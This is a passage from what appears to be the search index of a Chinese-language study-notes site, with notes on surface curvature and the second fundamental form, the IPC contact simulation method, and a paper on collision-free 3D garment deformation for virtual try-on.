<p>\u4eff\u7167\u66f2\u7ebf\u79ef\u5206\uff0c\u6211\u4eec\u4e3a\u6bcf\u4e00\u4e2a\u9876\u70b9\u5206\u914d\u4e00\u4e2a\u9762\u79ef\uff0c\u800c\u51fd\u6570\u7684\u79ef\u5206\u7b49\u4e8e\u9876\u70b9\u5904\u51fd\u6570\u503c\u4e58\u4e0a dual cell \u7684\u9762\u79ef\uff1a</p> <p></p> <p>\u5b9e\u9645\u4e0a\uff0c\u6839\u636e dual cell\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u539f\u59cb\u7f51\u683c\u7684\u57fa\u7840\u4e0a\u5b9a\u4e49\u4e00\u4e2a\u5bf9\u5076\u7f51\u683c\uff0c\u8fd9\u6837\u4e00\u4e2a\u66f2\u9762\u5b9e\u9645\u4e0a\u5bf9\u5e94\u4e86\u4e24\u4e2a\u7f51\u683c\uff1a</p> <p></p> <p>\u5bf9\u5076\u7f51\u683c\u4e5f\u901a\u8fc7\u534a\u8fb9\u6570\u636e\u7ed3\u6784\u8868\u793a\uff0c\u4e24\u8005\u53ef\u901a\u8fc7 \\(\\star\\) \u7b97\u5b50\u901a\u8fc7\u65cb\u8f6c\u534a\u8fb9\u6765\u8f6c\u6362</p>"},{"location":"Accumulation/ShapeAnalysis/CH5/","title":"Curvatures","text":""},{"location":"Accumulation/ShapeAnalysis/CH5/#curvature","title":"Curvature","text":"<p> \u7ea6 705 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p>"},{"location":"Accumulation/ShapeAnalysis/CH5/#second-fundamental-form","title":"Second Fundamental Form","text":"<p>\u4e3a\u4e86\u8861\u91cf\u66f2\u9762\u504f\u79bb\u5e73\u9762\u7684\u7a0b\u5ea6\uff0c\u6211\u4eec\u5f15\u5165\u4e86\u66f2\u7387\u7684\u6982\u5ff5\u3002\u66f2\u7387\u4e0d\u4ec5\u7528\u6765\u533a\u5206\u4e0d\u540c\u7684\u66f2\u9762\uff0c\u8fd8\u7528\u6765\u63cf\u8ff0\u5982\u4f55\u5d4c\u5165\u5230\u7a7a\u95f4\u4e2d\u3002</p> <p>\u56de\u5fc6\u4e4b\u524d\u5b9a\u4e49\u7684\u66f2\u9762\u6cd5\u5411\uff0c\u6211\u4eec\u8bb0\u66f2\u9762\uff08\u6d41\u5f62\uff09\u4e3a \\(\\mathcal M\\)\uff0c\u66f2\u9762\u4e0a \\(\\mathbf p\\) \u70b9\u7684\u5355\u4f4d\u6cd5\u5411\u91cf\u4e3a \\(\\mathbf n\\)\uff0c\u5207\u7a7a\u95f4\u4e3a \\(T_\\mathbf p \\mathcal M\\)\uff1a</p> <p></p> <p>\u4eff\u7167\u66f2\u7ebf\u7684 Gauss Map\uff0c\u6211\u4eec\u53ef\u7c7b\u4f3c\u5730\u5b9a\u4e49\u66f2\u9762\u4e0a\u7684\u9ad8\u65af\u6620\u5c04\uff0c\u5b83\u5c06\u66f2\u9762\u7684\u70b9\u6620\u5c04\u5230\u5355\u4f4d\u7403\u4e0a\uff1a</p> <p></p> <p>\u540c\u65f6\u4e3a\u4e86\u65b9\u4fbf\u540e\u9762\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u5f15\u5165\u6620\u5c04\u5fae\u5206\u7684\u5b9a\u4e49\u3002</p> <p>\u5bf9\u4e8e\u6d41\u5f62 \\(\\mathcal{M}\\) \u5230\u6d41\u5f62 \\(\\mathcal{N}\\) \u7684\u6620\u5c04 \\(\\varphi: \\mathcal M \\rightarrow \\mathcal N\\)\uff0c\u5728\u70b9 \\(\\mathbf{p}\\in \\mathcal M\\) \u53d6\u4e00\u4e2a\u5207\u5411\u91cf \\(\\mathbf v \\in T_\\mathbf p \\mathcal M\\)\uff0c\u5e76\u4e14\u7528\u7a7f\u8fc7 \\(\\mathbf p\\) \u7684\u66f2\u7ebf \\(\\gamma(t)\\) \u6765\u8868\u793a\u8be5\u5411\u91cf\uff1a\\(\\gamma(0)=\\mathbf p,\\ \\gamma '(0)=v\\)\u3002</p> <p>\u5219 \\(\\varphi\\) \u5728 \\(\\mathbf p\\) \u5904\u7684\u5fae\u5206 \\(d \\varphi_\\mathbf{p} : T_\\mathbf{p} \\mathcal{M} \\rightarrow T_{\\varphi(\\mathbf{p})} \\mathcal{N}\\) \u53ef\u4ee5\u8868\u793a\u4e3a\uff1a</p> \\[d \\varphi_\\mathbf{p} (\\mathbf v) = (\\varphi \\circ \\gamma)' (0)\\] <p>\u8fd9\u4e0d\u4f9d\u8d56\u4e8e \\(\\gamma(t)\\) \u7684\u9009\u53d6\uff0c\u800c\u53ea\u4e0e\u5207\u5411\u91cf \\(\\mathbf v\\) \u672c\u8eab\u6709\u5173</p> <p>\u5bf9\u4e8e\u9ad8\u65af\u6620\u5c04 \\(\\mathbf n: \\mathcal M \\rightarrow \\mathbb S^2\\)\uff0c\u6211\u4eec\u4ee3\u5165\u5fae\u5206\u516c\u5f0f\u53ef\u4ee5\u5f97\u5230\uff1a</p> \\[d \\mathbf{n}_\\mathbf{p} (\\mathbf{v}) = (\\mathbf{n} \\circ \\gamma)' (0)\\] <p>\u7531\u4e8e Gauss \u6620\u5c04 \\(\\mathbf{n}\\) \u7684\u50cf\u603b\u5728\u5355\u4f4d\u7403\u9762\u4e0a\uff0c\u4e14 \\(\\|\\mathbf n \\|^2 =1\\)\uff0c\u6211\u4eec\u6cbf \\(\\gamma\\) \u6c42\u5bfc\u53ef\u4ee5\u5f97\u5230\uff1a</p> \\[ \\frac{d}{dt}\\left ( \\mathbf n(\\gamma (t)) \\cdot ( \\mathbf n(\\gamma (t))  \\right) |_{t=0} =2 \\mathbf n(\\mathbf p) \\cdot  (\\mathbf{n} \\circ \\gamma)'(0) =0 \\] <p>\u5373 \\((\\mathbf{n} \\circ \\gamma)'(0) \\perp \\mathbf{n}_\\mathbf{p}\\)\uff0c\u8fd9\u8868\u793a \\(d \\mathbf{n}_\\mathbf{p} (\\mathbf{v})\\) \u4e00\u5b9a\u4f4d\u4e8e\u5207\u5e73\u9762 \\(T_\\mathbf{p} \\mathcal{M}\\) \u4e0a\uff0c\u5373</p> \\[d \\mathbf{n}_\\mathbf{p} (\\mathbf{v}) \\in T_\\mathbf{p} \\mathcal{M}\\] <p>\u5b9e\u9645\u4e0a \\(d\\mathbf{n}_\\mathbf{p}\\) \u4e5f\u79f0\u4e3a shape operator\u3002</p> <p>\u4e0e Shape Operator \u5bf9\u5e94\u7684\u5bf9\u79f0\u53cc\u7ebf\u6027\u578b\u79f0\u4e3a\u7b2c\u4e8c\u57fa\u672c\u578b\uff08Second Fundamental\uff09\uff1a</p> \\[\\mathbf{II} (\\mathbf{v}, \\mathbf{w}) = -\\mathbf{v} \\cdot d \\mathbf{n}_\\mathbf{p} (\\mathbf{w})\\] <p>\u5982\u679c\u6211\u4eec\u5c06\u5207\u5e73\u9762\u4e0a\u4e24\u4e2a\u76f8\u540c\u7684\u5411\u91cf \\(\\gamma'(0) = \\mathbf{T} \\in T_\\mathbf{p} \\mathcal{M}\\) \u9001\u5165\u7b2c\u4e8c\u57fa\u672c\u5f62\u5f0f \\(\\mathbf{II}\\)\uff0c\u53ef\u4ee5\u53d1\u73b0\u7b2c\u4e8c\u57fa\u672c\u5f62\u5f0f\u8fde\u63a5\u4e86\u66f2\u7ebf\u4e0e\u66f2\u9762\u7684\u6cd5\u5411\u3002\u9996\u5148\u5229\u7528\u5207\u5e73\u9762\u548c\u66f2\u9762\u6cd5\u5411\u7684\u5b9a\u4e49\u6709\uff1a</p> \\[\\gamma'(s) \\in T_\\mathbf{p} \\mathcal{M} \\Leftrightarrow \\gamma'(s) \\cdot \\mathbf{n} (\\gamma(s)) = 0\\] <p>\u5bf9\u4e24\u8fb9\u540c\u65f6\u5fae\u5206\u53ef\u4ee5\u83b7\u5f97\uff1a</p> \\[\\kappa \\mathbf{N}(s) \\cdot \\mathbf{n} (\\gamma(s)) + \\mathbf{T}(s) \\cdot d \\mathbf{n}_{\\gamma(s)} (\\gamma'(s)) = 0\\] <p>\u5f0f\u4e2d\uff0c\\(\\mathbf{T}(s)\\) \u548c \\(\\mathbf{N}(s)\\) \u5206\u522b\u4e3a\u66f2\u7ebf \\(\\gamma(s)\\) \u7684\u5207\u5411\u548c\u6cd5\u5411\uff0c\\(\\kappa\\) \u5219\u662f\u66f2\u7ebf\u7684\u66f2\u7387\u3002\u6ce8\u610f\u5230\u5de6\u8fb9\u7b2c\u4e8c\u9879\u7684\u5f62\u5f0f\u53ef\u4ee5\u6539\u5199\u4e3a\u66f2\u9762\u7684\u7b2c\u4e8c\u57fa\u672c\u5f62\u5f0f\uff1a</p> \\[\\mathbf{T}(s) \\cdot d \\mathbf{n}_{\\gamma(s)} (\\gamma'(s)) = \\mathbf{T}(s) \\cdot d \\mathbf{n}_{\\gamma(s)} (\\mathbf{T}(s)) = -\\mathbf{II} (\\mathbf{T}, \\mathbf{T})\\] <p>\u56e0\u6b64\u6709</p> \\[\\mathbf{II} (\\mathbf{T}, \\mathbf{T}) = \\kappa \\mathbf{N} \\cdot \\mathbf{n}\\]"},{"location":"Accumulation/paper/","title":"\u8bba\u6587\u9605\u8bfb","text":""},{"location":"Accumulation/paper/#_1","title":"\u8bba\u6587\u9605\u8bfb","text":"<p> \u7ea6 42 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>\u968f\u4fbf\u8bb0\u70b9\uff0c\u5904\u4e8e\u5b8c\u5168\u4e0d\u53ef\u9605\u8bfb\u7684\u72b6\u6001</p> \u52a0\u901f          <ul> <li> Linear Subspace Design for Real-Time Shape Deformation  1793  9 mins              1753799146 </li> <li> Progressive Shell Quasistatics for Unstructured Meshes  3329  70  18 mins              1758015353 </li> </ul>"},{"location":"Accumulation/paper/IPC_1/","title":"IPC","text":""},{"location":"Accumulation/paper/IPC_1/#ipc","title":"IPC","text":"<p> \u7ea6 473 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>https://ipc-sim.github.io/ https://zhuanlan.zhihu.com/p/154542103 https://clv-iclucia.github.io/2024/09/19/ipc-tips/</p>"},{"location":"Accumulation/paper/IPC_1/#overview","title":"Overview","text":"<p>IPC \u5168\u79f0 Incremental Potential Contact\u3002\u5176\u4e2d Incremental Potential \u662f\u57fa\u4e8e\u6570\u5b66\u4f18\u5316\u7684\u6709\u9650\u5143\u7269\u7406\u4eff\u771f\u65b9\u6cd5\u4e2d\uff0c\u5728\u6bcf\u4e00\u4e2a\u65f6\u95f4\u6b65\u4e2d\u8981\u6700\u5c0f\u5316\u7684\u51fd\u6570\u3002Contact \u5305\u62ec\u78b0\u649e\u548c\u6469\u64e6\uff0c\u5728\u4eff\u771f\u4e2d\u4f5c\u4e3a\u989d\u5916\u7684\u7ea6\u675f\u6761\u4ef6\u5b58\u5728\u3002</p> <p>IPC \u5c06\u7269\u4f53\u7684 Contact \u5de7\u5999\u5730\u878d\u5408\u5230\u76ee\u6807\u51fd\u6570 Incremental Potential \u4e2d\uff0c\u80fd\u591f\u8fbe\u5230\u7cbe\u786e\u3001\u7a33\u5b9a\u3001\u65e0\u7a7f\u900f\u7684\u6548\u679c\u3002</p>"},{"location":"Accumulation/paper/IPC_1/#contact-model","title":"Contact Model","text":""},{"location":"Accumulation/paper/IPC_1/#position-update","title":"Position Update","text":"<p>\u5728\u4e0d\u8003\u8651\u78b0\u649e\u65f6\uff0c\u5f39\u6027\u7269\u4f53\u7684\u6240\u6709\u91c7\u6837\u70b9 \\(x\\) \u5728\u6bcf\u4e2a\u65f6\u95f4\u6b65\u53ef\u901a\u8fc7\u6700\u5c0f\u5316 Incremental Potential \\(E(x)\\) \u6765\u66f4\u65b0\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u662f\u9690\u5f0f\u6b27\u62c9\u65f6\u95f4\u79ef\u5206\uff1a</p> \\[ x^{t+1} =argmin_x E(x)=argmin_x \\left( \\frac{1}{2} ||x-\\hat{x}^t||_M ^2 + \\Delta t^2 \\Psi (x) \\right ) \\] <ul> <li>\\(\\hat{x}^t= x^t + v^t \\Delta t + M^{-1} f_{ext} \\Delta t^2\\)<ul> <li>\\(v^t\\) \u53d6 \\((x^t - x^{t-1}) / \\Delta t\\)</li> </ul> </li> <li>\\(f_{ext}\\) \u6307\u8be5\u70b9\u6240\u53d7\u5916\u529b\uff08\u5305\u62ec\u91cd\u529b\uff09</li> <li>\\(M\\) \u4e3a\u91c7\u6837\u70b9\u7684\u8d28\u91cf\u77e9\u9635<ul> <li>\\(||x-\\hat{x}^t|| _M^2= (x-\\hat{x}^t)^TM (x-\\hat{x}^t)\\)</li> </ul> </li> <li>\\(\\Psi\\) \u662f\u5f39\u6027\u52bf\u80fd</li> </ul> <p>\u6211\u4eec\u4f7f\u7528\u725b\u987f\u8fed\u4ee3\u6cd5\u7a33\u5b9a\u3001\u7cbe\u786e\u6c42\u89e3 \\(E(x)\\) \u7684\u6700\u5c0f\u5316\u3002</p> <p>\u8003\u8651\u78b0\u649e\u65f6\uff0c\u5219\u9700\u8981\u989d\u5916\u52a0\u4e0a\u4e00\u4e2a\u201c\u65e0\u78b0\u649e\u201d\u7684\u7ea6\u675f\u6761\u4ef6\uff0cIPC \u8ba4\u4e3a\uff0c\u5982\u679c\u51c6\u786e\u7b97\u51fa\u7269\u4f53\u8868\u9762\u6bcf\u4e00\u4e2a\u201c\u70b9-\u4e09\u89d2\u5bf9\u201d\u548c\u201c\u8fb9-\u8fb9\u5bf9\u201d\u7684\u8ddd\u79bb\uff0c\u5728\u521d\u59cb\u72b6\u6001\u65e0\u91cd\u53e0\u7684\u60c5\u51b5\u4e0b\uff0c\u4fdd\u8bc1\u6240\u6709\u8fd9\u4e9b\u8ddd\u79bb\u5728\u6a21\u62df\u7684\u6bcf\u4e00\u4e2a\u65f6\u95f4\u6b65 \\(\\Delta t\\) \u4e2d\u7684\u4f18\u5316\u6bcf\u4e00\u6b21\u8fed\u4ee3\u8f68\u8ff9\u7684\u6bcf\u4e00\u5904\u90fd\u4e0d\u4e3a 0\uff0c\u5219\u7269\u4f53\u4e4b\u95f4\u5c31\u4e0d\u4f1a\u53d1\u751f\u7a7f\u900f\u3002</p>"},{"location":"Accumulation/paper/IPC_1/#distance-compute","title":"Distance Compute","text":"<p><code>ipc-toolkit</code> \u7684\u6240\u6709 distance \u76f8\u5173\u51fd\u6570\u90fd\u662f\u8ddd\u79bb\u7684\u5e73\u65b9\uff0c\u56e0\u4e3a\u5f00\u65b9\u7684\u8fd0\u7b97\u5b9e\u9645\u662f\u76f8\u5f53 Costly \u7684\u3002</p>"},{"location":"Accumulation/paper/IPC_1/#constraint-set","title":"Constraint Set","text":"<p>IPC \u7684\u7ea6\u675f\u4e3b\u8981\u6709 \u8fb9-\u8fb9 \u7ea6\u675f \u548c \u70b9-\u4e09\u89d2 \u7ea6\u675f\u3002\u53ea\u6709\u5728\u6211\u4eec\u7684 \\(\\hat{d}\\) \u8303\u56f4\u5185\u7684\u7ea6\u675f\u624d\u662f\u201c\u6d3b\u8dc3\u201d\u7684\uff0c\u56e0\u6b64\u5728\u6bcf\u6b21\u53d1\u751f\u53d8\u5316\u65f6\u90fd\u8981\u91cd\u65b0\u8ba1\u7b97\u7ea6\u675f\u3002</p>"},{"location":"Accumulation/paper/IPC_1/#barrier-potential","title":"Barrier Potential","text":"<p>\u51fa\u73b0\u5728 Section 4.2</p>"},{"location":"Accumulation/paper/Transfer_1/","title":"Self-Supervised Collision Handling via Generative 3D Garment Models for Virtual Try-On","text":""},{"location":"Accumulation/paper/Transfer_1/#self-supervised-collision-handling-via-generative-3d-garment-models-for-virtual-try-on","title":"Self-Supervised Collision Handling via Generative 3D Garment Models for Virtual Try-On","text":"<p> \u7ea6 1462 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>From https://mslab.es/projects/SelfSupervisedGarmentCollisions/</p>"},{"location":"Accumulation/paper/Transfer_1/#overview","title":"Overview","text":"<p>Abstract</p> <p>\u4e00\u79cd\u65b0\u7684\u7528\u4e8e 3D \u670d\u88c5\u53d8\u5f62\u7684\u751f\u6210\u6a21\u578b\u3002\u4e0e\u73b0\u6709\u7684\u4f7f\u7528\u540e\u671f\u5904\u7406\u6b65\u9aa4\u6765\u4fee\u590d\u670d\u88c5\u4e0e\u8eab\u4f53\u7a7f\u6a21\u7684\u65b9\u6cd5\u4e0d\u540c\uff0c\u8be5\u8bba\u6587\u7ed9\u51fa\u7684\u65b9\u6cd5\u76f4\u63a5\u8f93\u51fa\u4e0d\u4e0e\u8eab\u4f53\u78b0\u649e\u7684\u670d\u88c5\u3002</p> <p>\u6570\u5b57\u5316 3D \u670d\u88c5\u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\u5f88\u591a\u9886\u57df\u5df2\u6709\u5e94\u7528\uff0c\u4f20\u7edf\u7684\u57fa\u4e8e\u7269\u7406\u7684\u65b9\u6cd5\u5df2\u7ecf\u7ed9\u51fa\u4e86\u51c6\u786e\u3001\u9002\u7528\u4e8e\u4efb\u4f55\u670d\u88c5\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u4f46\u662f\u5176\u5e9e\u5927\u7684\u8ba1\u7b97\u91cf\u4e0d\u8db3\u4ee5\u652f\u6301\u5b9e\u65f6\u8fd0\u884c\u3002</p> <p>Data-driven Methods \u5df2\u7ecf\u6210\u4e3a Physics-based Methods \u7684\u4e00\u79cd\u6d41\u884c\u66ff\u4ee3\u65b9\u6848\uff0c\u5176\u6838\u5fc3\u601d\u60f3\u662f\u5b66\u4e60\u4e00\u4e2a\u5927\u6570\u636e\u96c6\u4e0b\u89c2\u5bdf\u5230\u7684\u670d\u88c5\u6a21\u62df\u884c\u4e3a\u7684\u51fd\u6570\u3002\u73b0\u6709\u7684\u57fa\u4e8e\u6570\u636e\u65b9\u6cd5\u5b58\u5728\u4e00\u4e2a\u57fa\u672c\u9650\u5236\uff1a\u5c3d\u7ba1\u8bad\u7ec3\u65f6\u8bbe\u7f6e\u4e86\u7a7f\u6a21\u7684 Penalty\uff0c\u5728\u6d4b\u8bd5\u65f6\u4ecd\u7136\u4f1a\u51fa\u73b0\u670d\u88c5\u4e0e\u8eab\u4f53\u4e92\u76f8\u7a7f\u900f\u7684\u73b0\u8c61\u3002\u8fd9\u5c31\u9700\u8981\u540e\u671f\u989d\u5916\u904d\u5386\u67e5\u627e\u7136\u540e\u89e3\u51b3\u5b83\u3002</p> <p>\u6211\u4eec\u7684\u6a21\u578b\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u70b9\u8d21\u732e\uff1a</p> <ul> <li>&lt;1&gt; \u901a\u8fc7\u5b66\u4e60\u5c06 Surface Parameter \u5e73\u6ed1\u62d3\u5c55\u5230\u4efb\u610f 3D Point \u6765\u589e\u5f3a\u73b0\u6709\u7684\u4eba\u4f53\u6a21\u578b\u3002<ul> <li>\u8fd9\u4f7f\u6211\u4eec\u80fd\u591f\u5bf9\u4efb\u610f 3D Point \u5efa\u6a21</li> <li>\u7ecf\u8fc7\u62d3\u5c55\u7684\u4eba\u4f53\u6a21\u578b\u662f\u6211\u4eec\u65b9\u6cd5\u7684\u57fa\u672c\u6784\u5efa\u5757</li> </ul> </li> <li>&lt;2&gt; \u9488\u5bf9\u73b0\u6709\u7684\u6570\u636e\u9a71\u52a8\u6a21\u578b\uff0c\u5b83\u4eec\u5e38\u5047\u8bbe\u670d\u88c5\u53d8\u5f62\u7d27\u8ddf\u7740\u5e95\u5c42\u8eab\u4f53\u53d8\u5f62<ul> <li>\u8fd9\u79cd\u7b80\u5316\u7ecf\u5e38\u7528\u5728\u5b9a\u4e49\u9759\u6b62\u59ff\u52bf\u4e0b\u4f7f\u7528\u57fa\u4e8e Closest Body Vertex \u7684 Skinning Parameters \uff0c\u7136\u540e\u901a\u8fc7 Standard Linear Blend Skinning(LBS) \u6765\u8868\u793a\u670d\u88c5\u7684 Garment Models\u3002</li> <li>\u6211\u4eec\u8ba4\u4e3a\u8fd9\u79cd\u7b80\u5316\u4e0d\u80fd\u6b63\u786e\u8868\u793a\u590d\u6742\u5f62\u53d8\uff0c\u4ee5\u53ca\u5bb9\u6613\u51fa\u73b0\u610f\u5916\u7684\u4f2a\u5f71</li> <li>\u6211\u4eec\u63d0\u51fa\u7684 Garment Model \u5728 unposed, deshaped \u7684 canonical space \u4e2d\u8868\u793a\u5f62\u53d8\uff0c\u65b9\u6cd5\u662f\u53bb\u9664\u5df2\u7ecf\u88ab\u6211\u4eec\u589e\u5f3a\u8fc7\u4e86\u7684 Expanded Human Body Model \u6355\u83b7\u5230\u7684\u5f62\u53d8</li> </ul> </li> <li>&lt;3&gt; \u7b2c\u4e09\u70b9\u4e5f\u662f\u6700\u4e3b\u8981\u7684\u4e00\u70b9\uff0c\u662f\u5229\u7528\u670d\u88c5\u7684 Canonical \u8868\u793a\u53bb\u5b66\u4e60\u5f62\u53d8\u7684\u751f\u6210\u5f0f\u5b50\u7a7a\u95f4<ul> <li>\u5728\u8fd9\u4e2a Canonical Space \u4e2d\uff0c\u670d\u88c5\u5173\u4e8e\u4e00\u4e2a\u5e38\u6570\u7684 Reference Body Configuration \u8fdb\u884c\u7f16\u7801\uff0c\u8fd9\u4e0d\u4ec5\u4f18\u5316\u4e86\u670d\u88c5\u5f62\u53d8\u8868\u73b0\uff0c\u8fd8\u5141\u8bb8\u6211\u4eec\u901a\u8fc7\u81ea\u6211\u76d1\u7763\u6765\u53ef\u9760\u5b66\u4e60\u78b0\u649e\u89e3\u51b3\u3002</li> <li>\u7136\u540e\u6211\u4eec\u5b66\u4e60\u4e00\u4e2a Regressor\uff0c\u8be5\u56de\u5f52\u5668\u8f93\u51fa\u5728\u8fd9\u4e2a\u5b50\u7a7a\u95f4\u7f16\u7801\u7684 Mesh Deformations\uff0c\u7136\u540e\u7528\u6211\u4eec\u7684 Garment Model \u5c06\u5176\u6295\u5f71\u5230\u6700\u7ec8\u7684\u5f62\u53d8\u72b6\u6001\u3002</li> </ul> </li> </ul> <p>\u7531\u4e8e\u5f62\u53d8\u7684\u751f\u6210\u5f0f\u5b50\u7a7a\u95f4\u4ee5\u53ca\u6700\u540e\u7684\u6295\u5f71\u6b65\u9aa4\u90fd\u6ca1\u6709\u7a7f\u6a21\uff0c\u56e0\u6b64\u6700\u7ec8\u53d8\u5f62\u7684 3D \u670d\u88c5\u4e5f\u4e0d\u4f1a\u7a7f\u6a21</p> <p></p> <p>\u6211\u4eec\u7684\u76ee\u6807\u662f\u5b66\u4e60\u4e00\u4e2a\u51fd\u6570\uff0c\u4f7f\u5176\u80fd\u591f\u9884\u6d4b\u4e00\u4e2a 3D \u670d\u88c5\u5982\u4f55\u5728\u7ed9\u5b9a\u7684\u4e0d\u540c\u59ff\u52bf\u3001\u4e0d\u540c\u5f62\u6001\u7684\u4eba\u4f53\u6a21\u578b\u4e0a\u52a8\u6001\u53d8\u5f62\u3002</p> <ul> <li>Section 4.1 \u4ecb\u7ecd\u4e86\u6807\u51c6\u9759\u6001\u4eba\u4f53\u6a21\u578b\u7684\u62d3\u5c55\uff0c\u5b83\u5b66\u4e60\u4e86\u5e73\u6ed1\u5730 diffuse skinning surface parameters \u5230 3D \u7a7a\u95f4\u5185\u4efb\u610f\u70b9<ul> <li>skinning parameters \u5305\u62ec rigging weights \u548c blendshape correctives</li> </ul> </li> <li>Section 4.2 \u4e2d\u6211\u4eec\u5229\u7528\u6269\u6563\u4e86\u7684 skinning parameters \u53bb\u5b9a\u4e49\u4e00\u4e2a\u670d\u88c5\u53d8\u5f62\u6a21\u578b\uff0c<ul> <li>\u5728\u6211\u4eec\u6784\u5efa\u7684 Unposed &amp; Deshaped canonical space of garments \u4e2d\uff0c\u670d\u88c5\u4ee5\u4f11\u606f\u59ff\u52bf\u548c\u5e73\u5747\u5f62\u72b6\u51fa\u73b0\uff0c\u4f46\u4fdd\u7559\u4e0e\u59ff\u52bf\u548c\u5f62\u72b6\u76f8\u5173\u7684\u76b1\u7eb9\u7ec6\u8282</li> </ul> </li> <li>Section 4.3 \u7ed9\u51fa\u4e86\u57fa\u4e8e\u4f18\u5316\u7684\u65b0\u7b56\u7565\uff0c\u7528\u6765\u5c06\u57fa\u4e8e\u7269\u7406\u7684\u4eff\u771f\u6295\u5f71\u5230\u6211\u4eec\u5b9a\u4e49\u7684 canonical space \u4e2d</li> </ul>"},{"location":"Accumulation/paper/Transfer_1/#implementation","title":"Implementation","text":""},{"location":"Accumulation/paper/Transfer_1/#41-diffused-human-model","title":"4.1 Diffused Human Model","text":"<p>\u5f53\u4eca\u7684 Body Model \u6a21\u677f\u4e3a\uff1a</p> \\[\\tag {2}  M(\\beta, \\theta) = W(T_b(\\beta, \\theta), J(\\beta), \\theta, \\mathcal{W}) \\] <ul> <li>\\(W\\) \u4e3a Skinning Function\uff0c\u4f8b\u5982 linear blend skinning\u3001dual quaternion \u7b49</li> <li>\\(\\mathcal{W}\\) \u4e3a Skinning Weight</li> <li>\\(\\theta\\) \u4e3a Pose Parameter</li> <li>\\(T_b(\\beta, \\theta)\\) \u4e3a Unposed Parametric Body Mesh</li> </ul> <p>\u76ee\u524d\u6807\u51c6 SMPL \u6a21\u578b\u5b9a\u4e49\u7684 \\(T_b(\\beta, \\theta)\\) \u5982\u4e0b\uff1b</p> \\[\\tag {3} T_b(\\beta, \\theta) = T_b + B_s(\\beta) + B_p(\\theta) \\] <ul> <li>\\(T_b\\in R^{N_B \\times 3}\\) \u4e3a\u5177\u6709 \\(N_B\\) \u4e2a\u9876\u70b9\u7684 Body Mesh Template</li> <li>\\(B_s(\\beta)\\in R^{N_B \\times 3}\\) \u8868\u793a\u7528\u4e8e\u6539\u53d8 Body Shape \u7684\u5f62\u53d8</li> <li>\\(B_p(\\theta)\\in R^{N_B \\times 3}\\) \u8868\u793a\u7528\u4e8e\u4fee\u6b63 Skinning Artifacts \u7684\u5f62\u53d8</li> </ul> <p>\u73b0\u6709\u7684\u6570\u636e\u9a71\u52a8\u670d\u88c5\u6a21\u578b\u5229\u7528 (2) \u4e2d\u5b9a\u4e49\u7684 Body Model\uff0c\u5047\u8bbe\u8863\u670d\u7d27\u8ddf\u7740\u8eab\u4f53\u7684\u53d8\u5f62\u3002\u4e00\u79cd\u5e38\u89c1\u7684\u65b9\u6cd5\u662f\u501f\u7528 Skinning Weight \\(\\mathcal{W}\\) \u6765\u6a21\u62df\u8863\u670d\u7684\u5173\u8282\uff0c\u901a\u5e38\u9700\u8981\u5728\u9759\u6b62\u59ff\u6001\u4e0b\u7a77\u4e3e\u641c\u7d22\u6bcf\u4e00\u4e2a Garment Vertex \u79bb\u5f97\u6700\u8fd1\u7684 Body Vertex\u3002</p> <p>\u6211\u4eec\u8ba4\u4e3a\u8fd9\u79cd\u7b80\u5355\u7684\u9759\u6001\u5206\u914d\u4e0d\u80fd\u6b63\u786e\u6a21\u62df\u590d\u6742\u7684\u975e\u521a\u6027\u670d\u88c5\u6548\u679c\uff0c\u539f\u56e0\u6709\u5982\u4e0b\u4e24\u70b9\uff1a</p> <ul> <li>&lt;1&gt; Garment-Body Nearest Vertex \u7684\u5206\u914d\u5fc5\u987b\u52a8\u6001\u66f4\u65b0<ul> <li>\u4f8b\u5982\uff0c\u8863\u670d\u5728\u76ae\u80a4\u8868\u9762\u6ed1\u52a8\u65f6</li> </ul> </li> <li>&lt;2&gt; Garment-Body Vertex \u4e0d\u80fd\u4ec5\u7531 Closest Vertex \u9a71\u52a8\uff0c\u56e0\u4e3a\u8fd9\u4f1a\u5f15\u8d77 Medial-axis areas \u610f\u5916\u7684\u4e0d\u8fde\u7eed\u6027</li> </ul> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u7f3a\u70b9\uff0c\u6211\u4eec\u63d0\u51fa\u5c06 (2) \u4e2d\u7684 Body Model \u5e73\u6ed1\u6269\u6563\u5230 Body \u5468\u56f4\u4efb\u610f 3D Point \u4e2d\u3002\u6211\u4eec\u5b9a\u4e49\u4e86\u4ee5\u4e0b\u51fd\u6570\u6765\u5c06 Skinning Weights\u3001Shape Blendshape Offset\u3001Pose Blendshape Offset \u5206\u522b\u6269\u6563\u5230\u4efb\u610f\u70b9 \\(p\\in R^3\\) :</p> \\[\\begin{align} \\tag{4}  \\widetilde{\\mathcal W}(p)= \\frac{1}{N} \\sum_{ q_n\\sim \\mathcal N (p,d)} \\mathcal W (\\phi (q_n)) \\\\ \\tag {5} \\widetilde {B_s} (p, \\beta) =\\frac{1}{N} \\sum_{ q_n\\sim \\mathcal N (p,d)} B_s (\\phi(q_n), \\beta) \\\\ \\tag {6} \\widetilde {B_p} (p, \\theta) = \\frac{1}{n} \\sum_{ q_n\\sim \\mathcal N (p,d)} B_p (\\phi (q_n), \\theta) \\end{align} \\] <ul> <li>\\(d\\) \u4e3a\u70b9 \\(p\\) \u5230 surface body \u7684\u8ddd\u79bb</li> <li>\\(\\phi(p)\\) \u7528\u4e8e\u8ba1\u7b97\u79bb \\(p\\) \u6700\u8fd1\u7684 surface point</li> </ul> <p>\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u70b9 \\(p\\) \uff0c\u6211\u4eec\u53d6\u5176\u5468\u56f4 \\(N\\) \u4e2a\u90bb\u70b9\u7684\u76f8\u5e94\u503c\u7684\u5e73\u5747\uff0c\u4ece\u800c\u51cf\u8f7b\u4e86\u6f5c\u5728\u4e0d\u8fde\u7eed\u6027\u7684\u5f71\u54cd\u3002</p>"},{"location":"Accumulation/paper/Transfer_1/#42-garment-model","title":"4.2 Garment 